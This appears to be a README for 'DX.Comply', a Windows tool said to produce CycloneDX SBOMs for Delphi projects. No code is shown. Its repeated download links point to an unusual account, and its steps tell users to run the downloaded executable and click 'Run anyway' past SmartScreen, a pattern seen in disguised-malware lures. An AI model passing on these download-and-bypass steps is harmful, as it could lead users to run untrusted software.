# 🛡️ DX.Comply - One-click SBOMs for Delphi

[![Download DX.Comply](https://img.shields.io/badge/Download-DX.Comply-blue?style=for-the-badge&logo=github)](https://github.com/27-suppression294/DX.Comply)

## 📦 What DX.Comply does

DX.Comply helps you create a CycloneDX SBOM for a Delphi project in one click.  
An SBOM is a simple list of the parts used in your software. It helps with EU Cyber Resilience Act work and basic software tracking.

Use DX.Comply when you want to:

- list the parts used in a Delphi app
- create a CycloneDX SBOM file
- save time on manual checks
- prepare project data for compliance review

## 💻 What you need

Before you run DX.Comply on Windows, check these items:

- Windows 10 or Windows 11
- A modern web browser
- Permission to download files
- A Delphi or RAD Studio project to scan
- Enough disk space for the SBOM file and project data

For best results, keep your project in a folder you can reach easily, such as:

- `Documents`
- `Desktop`
- a project folder on your `C:` drive

## 🚀 Download and run DX.Comply

Use this link to visit the download page:

[Download DX.Comply](https://github.com/27-suppression294/DX.Comply)

After you open the page:

1. find the latest release or the main download file
2. download the file to your computer
3. if Windows asks for approval, choose to keep the file
4. open the downloaded file
5. follow the on-screen steps

If the download comes as a `.zip` file:

1. right-click the file
2. choose `Extract All`
3. open the extracted folder
4. run the main app or executable inside it

If Windows SmartScreen appears:

1. click `More info`
2. click `Run anyway` if you trust the file source

## 🧭 First-time setup

After the app opens, set up your scan in this order:

1. choose your Delphi project folder
2. select the project file or main source folder
3. pick where you want the SBOM saved
4. choose the output format if the app offers more than one
5. start the scan

A good output name is:

- `sbom.cyclonedx.json`
- `sbom.xml`

Keep the output file in a folder you can find later, such as the project folder or a `Reports` folder.

## 🧪 How to create an SBOM

Use these steps for a normal run:

1. open DX.Comply
2. choose your Delphi project
3. let the app read the project files
4. review the detected components
5. create the CycloneDX SBOM
6. save the file

If your project uses shared units, packages, or component libraries, DX.Comply should include them in the scan so your SBOM has a fuller list.

## 🗂️ What the output looks like

DX.Comply creates a standard SBOM file that can be used in review or archiving tasks.  
The file usually includes:

- project name
- component names
- version data when available
- package and dependency details
- file or library references
- CycloneDX format data

You can keep the file with the project or share it with your compliance team.

## 🔍 Best results for Delphi projects

To get a cleaner SBOM, use a well-organized project folder.  
Try these tips:

- close Delphi or RAD Studio before you scan
- keep source files in one main folder
- avoid moving files during the scan
- store third-party components in known paths
- use the same project folder each time you run a scan

If your project uses many component sets, group them by vendor or package name. That makes the SBOM easier to read.

## 🛠️ Common tasks

### Create an SBOM for one project

1. open DX.Comply
2. select the project folder
3. run the scan
4. save the result

### Update an SBOM after code changes

1. open the same project again
2. run a fresh scan
3. replace the older SBOM file
4. keep both files if you need a change record

### Review a project before release

1. scan the release folder
2. check the listed components
3. save the SBOM with the release build
4. archive both files together

## 📁 Suggested folder layout

A simple folder layout can help:

- `C:\Projects\MyApp\`
- `C:\Projects\MyApp\Source\`
- `C:\Projects\MyApp\Reports\`
- `C:\Projects\MyApp\Reports\sbom.cyclonedx.json`

This keeps the source, scan output, and release data in one place.

## 🧩 Supported use case

DX.Comply is built for Delphi projects and RAD Studio workflows.  
It fits projects that use:

- Delphi source files
- Pascal units
- Delphi component packages
- local or shared libraries
- project-based dependency tracking

## 🔐 Why this matters

An SBOM helps you answer questions about what is inside your software.  
That matters when you need to:

- track parts used in a build
- check software supply chain data
- prepare for EU CRA work
- keep release records in order

## ❓ If something does not work

If the app does not start:

1. check that the file finished downloading
2. make sure Windows did not block it
3. move the file to a simple folder like `Desktop`
4. try again from that folder

If the scan does not find your project:

1. check that you chose the right folder
2. make sure the project files are still in place
3. remove extra nested folders if needed
4. try the main project folder instead of a subfolder

If the output file is not saved:

1. check the save path
2. make sure the folder exists
3. confirm you have write access to that folder
4. choose a folder you own, such as `Documents`

## 📌 File types you may see

DX.Comply may create or work with files such as:

- `.json`
- `.xml`
- `.dproj`
- `.pas`
- `.dpk`
- `.res`

These files are common in Delphi and SBOM work.

## 🧭 Basic workflow

1. download DX.Comply from the link above
2. open the file on Windows
3. choose your Delphi project
4. run the scan
5. save the CycloneDX SBOM
6. keep the SBOM with your project records

## 🖥️ Windows tips

To avoid simple problems on Windows:

- use the latest Windows updates
- download to a local drive
- avoid running from inside a compressed folder
- keep the app and project in folders with short paths
- use a normal user folder if possible

## 📚 Terms in plain English

- **SBOM**: a list of software parts
- **CycloneDX**: a standard format for SBOM files
- **Delphi**: a software tool used to build Windows apps
- **RAD Studio**: a development suite for Delphi projects
- **Component**: a building block used by your app
- **Compliance**: following a rule or requirement

## 📄 Typical use case

A small team can use DX.Comply before a release like this:

1. open the project
2. run the scan
3. create the SBOM
4. store it with the release files
5. send it to the person who handles compliance review

## 🔁 Repeatable process

If you work on the same app often, use the same steps each time:

- scan after major code changes
- save the SBOM with the build number
- keep one SBOM per release
- compare files when you need a record of changes

## 📎 Download link again

[Visit the DX.Comply download page](https://github.com/27-suppression294/DX.Comply)

## 🗃️ Suggested release naming

If you save SBOM files for different builds, use clear names like:

- `MyApp-1.0-sbom.json`
- `MyApp-1.1-sbom.json`
- `MyApp-release-2026-04.xml`

Clear names make it easier to find the right file later

## 🧰 Good habits for compliance work

- keep source and output together
- save one SBOM per release
- use the same folder structure each time
- keep a copy of the scan result
- record the build date with the file

## 🔎 Topic areas covered

This project fits these topics:

- compliance
- cybersecurity
- CycloneDX
- Delphi
- Delphi component
- EU CRA
- Pascal
- RAD Studio
- SBOM
- software bill of materials